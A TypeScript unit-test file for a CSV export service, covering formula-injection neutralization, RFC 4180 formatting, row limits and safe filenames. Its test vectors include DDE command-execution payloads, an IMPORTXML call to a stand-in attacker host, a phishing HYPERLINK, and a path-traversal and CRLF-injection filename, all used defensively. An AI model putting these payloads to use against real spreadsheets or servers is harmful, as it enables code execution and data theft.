import { describe, it, beforeEach } from "node:test";
import assert from "node:assert/strict";
import {
    CsvExporterService,
    sanitizeCsvCell,
    formatCsvField,
    isFormulaPayload,
} from "../../src/modules/export/csv-exporter.service.js";

describe("Sprint 6 - Task 5: Safe CSV Serializer & Formula Injection Neutralization (US-14 / DO-08)", () => {
    let exporter: CsvExporterService;

    beforeEach(() => {
        exporter = new CsvExporterService();
    });

    describe("1. OWASP CSV Formula Injection Neutralization", () => {
        const owaspVectors = [
            { name: "Command execution via DDE", payload: "=cmd|' /C calc'!A0", prefix: "'=" },
            { name: "Addition formula", payload: "+SUM(1,1)", prefix: "'+SUM" },
            { name: "Subtraction command chain", payload: "-2+3+cmd|' /C calc'!D2", prefix: "'-2+3" },
            { name: "XML Import exfiltration", payload: '@IMPORTXML("https://attacker.com/leak", "//a")', prefix: "'@IMPORTXML" },
            { name: "Tab-prefixed formula injection", payload: "\t=1+1", prefix: "'\t=1+1" },
            { name: "Carriage-return-prefixed formula", payload: "\r=1+1", prefix: "'\r=1+1" },
            { name: "Leading whitespace formula injection", payload: "   =SUM(A1:A10)", prefix: "'   =SUM" },
            { name: "Hyperlink phishing vector", payload: '=HYPERLINK("https://phishing.site", "Click Here")', prefix: "'=HYPERLINK" },
            { name: "Complex payload with internal quotes", payload: '=cmd|"/C powershell -c calc"!A0', prefix: "'=cmd" },
        ];

        for (const vector of owaspVectors) {
            it(`neutralizes OWASP vector: ${vector.name}`, () => {
                assert.equal(isFormulaPayload(vector.payload), true, `Should detect ${vector.name} as formula payload`);

                const sanitized = sanitizeCsvCell(vector.payload);
                assert.ok(
                    sanitized.startsWith(vector.prefix),
                    `Expected sanitized value to start with '${vector.prefix}', got '${sanitized}'`
                );

                const formatted = formatCsvField(vector.payload);
                // When formatted into CSV according to RFC 4180, fields starting with single quote must be enclosed in double quotes
                assert.ok(formatted.startsWith('"\''), `Formatted field must start with "' to prevent Excel execution: ${formatted}`);
                assert.ok(formatted.endsWith('"'), `Formatted field must end with ": ${formatted}`);
            });
        }

        it("neutralizes formula payload embedded in column headers", () => {
            const maliciousHeader = "=cmd|' /C calc'!A0";
            const result = exporter.serialize({
                columns: [maliciousHeader],
                rows: [{ [maliciousHeader]: "safe_value" }],
            });

            const firstLine = result.csv.split("\r\n")[0];
            assert.ok(firstLine.startsWith('"\'=cmd'), `Header should be neutralized with single quote: ${firstLine}`);
        });
    });

    describe("2. RFC 4180 Compliance & Type Formatting", () => {
        it("preserves NULL and undefined values as empty strings without quotes", () => {
            assert.equal(sanitizeCsvCell(null), "");
            assert.equal(sanitizeCsvCell(undefined), "");
            assert.equal(formatCsvField(null), "");
            assert.equal(formatCsvField(undefined), "");
        });

        it("escapes internal double quotes as double double-quotes (\"\") and encloses in quotes", () => {
            const val = 'Widget "Deluxe" Model';
            const formatted = formatCsvField(val);
            assert.equal(formatted, '"Widget ""Deluxe"" Model"');
        });

        it("encloses fields containing commas in double quotes", () => {
            const val = "London, UK";
            const formatted = formatCsvField(val);
            assert.equal(formatted, '"London, UK"');
        });

        it("encloses fields containing newlines or carriage returns in double quotes", () => {
            const multiline = "Line 1\nLine 2";
            const formatted = formatCsvField(multiline);
            assert.equal(formatted, '"Line 1\nLine 2"');
        });

        it("formats standard numbers, booleans, and ISO dates deterministically", () => {
            assert.equal(formatCsvField(42), "42");
            assert.equal(formatCsvField(3.14159), "3.14159");
            assert.equal(formatCsvField(true), "true");
            assert.equal(formatCsvField(false), "false");

            const date = new Date("2026-06-15T12:00:00.000Z");
            assert.equal(formatCsvField(date), "2026-06-15T12:00:00.000Z");
        });

        it("uses CRLF (\\r\\n) line breaks across headers and row records", () => {
            const result = exporter.serialize({
                columns: ["id", "name", "price"],
                rows: [
                    { id: 1, name: "Item A", price: 10.5 },
                    { id: 2, name: "Item B", price: 20.0 },
                ],
            });

            const lines = result.csv.split("\r\n");
            assert.equal(lines.length, 3);
            assert.equal(lines[0], "id,name,price");
            assert.equal(lines[1], "1,Item A,10.5");
            assert.equal(lines[2], "2,Item B,20");
        });
    });

    describe("3. Bounded Row & Byte Clamping", () => {
        it("clamps exported rows to maxRows (default 500) and sets metadata.truncated = true", () => {
            const rows = Array.from({ length: 600 }, (_, i) => ({
                id: i + 1,
                name: `Product ${i + 1}`,
            }));

            const result = exporter.serialize({
                columns: ["id", "name"],
                rows,
            });

            assert.equal(result.metadata.rowCount, 500);
            assert.equal(result.metadata.truncated, true);

            // 1 header line + 500 data lines = 501 lines
            const lines = result.csv.split("\r\n");
            assert.equal(lines.length, 501);
        });

        it("flags metadata.truncated = true when payload exceeds maxBytes", () => {
            const result = exporter.serialize({
                columns: ["id", "data"],
                rows: [{ id: 1, data: "small" }],
                maxBytes: 10, // Very small threshold
            });

            assert.equal(result.metadata.truncated, true);
        });
    });

    describe("4. Security Headers, Filename Sanitization & UTF-8 BOM", () => {
        it("generates Content-Disposition and text/csv; charset=utf-8 headers", () => {
            const result = exporter.serialize({
                columns: ["id"],
                rows: [{ id: 1 }],
                executionId: "exec_12345",
            });

            assert.equal(result.contentType, "text/csv; charset=utf-8");
            assert.equal(result.contentDisposition, 'attachment; filename="query-results-exec_12345.csv"');
            assert.equal(result.metadata.fileName, "query-results-exec_12345.csv");
            assert.equal(result.metadata.formulaInjectionNeutralized, true);
        });

        it("neutralizes path traversal and CRLF injection attempts in filename", () => {
            const maliciousId = "../../etc/passwd\r\nSet-Cookie: stolen=true";
            const safeName = exporter.generateSafeFileName(maliciousId);

            assert.ok(!safeName.includes(".."));
            assert.ok(!safeName.includes("/"));
            assert.ok(!safeName.includes("\r"));
            assert.ok(!safeName.includes("\n"));
            assert.equal(safeName, "query-results-______etc_passwd__Set-Cookie__stolen_true.csv");
        });

        it("includes UTF-8 Byte Order Mark (\\uFEFF) when includeBom: true", () => {
            const result = exporter.serialize({
                columns: ["id", "name"],
                rows: [{ id: 1, name: "Test" }],
                includeBom: true,
            });

            assert.ok(result.csv.startsWith(CsvExporterService.UTF8_BOM));
            assert.equal(result.buffer[0], 0xEF);
            assert.equal(result.buffer[1], 0xBB);
            assert.equal(result.buffer[2], 0xBF);
        });
    });
});
